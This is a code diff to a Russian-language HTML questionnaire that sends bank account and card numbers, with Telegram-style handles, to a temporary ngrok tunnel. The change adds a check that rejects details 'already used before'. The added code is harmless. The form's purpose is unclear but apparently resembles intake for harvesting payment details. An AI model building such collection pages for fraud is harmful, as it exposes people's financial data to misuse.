@@ -99,12 +99,17 @@
     .add-bank-btn:hover {
       background: #0099e6;
     }
+    .error-message {
+      color: #dc3545;
+      font-size: 14px;
+      margin-top: 10px;
+    }
   </style>
 </head>
 <body>
   <div class="container">
     <h2>Анкета</h2>
-    <form id="form" action="https://e79b-188-162-54-197.ngrok-free.app/submit" method="post">
+    <form id="form" action="https://e79b-188-162-54-197.ngrok-free.app/submit" method="post" onsubmit="return validateForm()">
       <input type="hidden" id="chat_id" name="chat_id"> <!-- Скрытое поле для chat_id -->
       <input type="hidden" id="owner_id" name="owner_id" value="@helper_kong"> <!-- Скрытое поле с постоянным значением -->
 
@@ -131,6 +136,8 @@
 
       <label for="add_to_chat">Добавить в чат:</label>
       <input type="text" id="add_to_chat" name="add_to_chat" required pattern="@.*" title="Начинается с @" value="@" onblur="validateField(this)">
+
+      <div id="error-message" class="error-message" style="display: none;">Эти реквизиты уже были использованы ранее.</div>
 
       <h3>🏦1️⃣</h3>
       <div id="banks">
@@ -241,6 +248,37 @@
       } else {
         alert("Первая карта не может быть удалена.");
       }
+    }
+
+    function validateForm() {
+      const accountNumbers = new Set();
+      const cardNumbers = new Set();
+      const accountFields = document.querySelectorAll('input[name^="banks"][name$="[account]"]');
+      const cardFields = document.querySelectorAll('input[name^="banks"][name*="[cards]"]');
+      
+      for (let account of accountFields) {
+        if (accountNumbers.has(account.value)) {
+          showError("Эти реквизиты уже были использованы ранее.");
+          return false;
+        }
+        accountNumbers.add(account.value);
+      }
+      
+      for (let card of cardFields) {
+        if (cardNumbers.has(card.value)) {
+          showError("Эти реквизиты уже были использованы ранее.");
+          return false;
+        }
+        cardNumbers.add(card.value);
+      }
+      
+      return true; // Если дубликатов нет, отправляем форму
+    }
+
+    function showError(message) {
+      const errorMessage = document.getElementById("error-message");
+      errorMessage.innerText = message;
+      errorMessage.style.display = "block";
     }
   </script>
 </body>
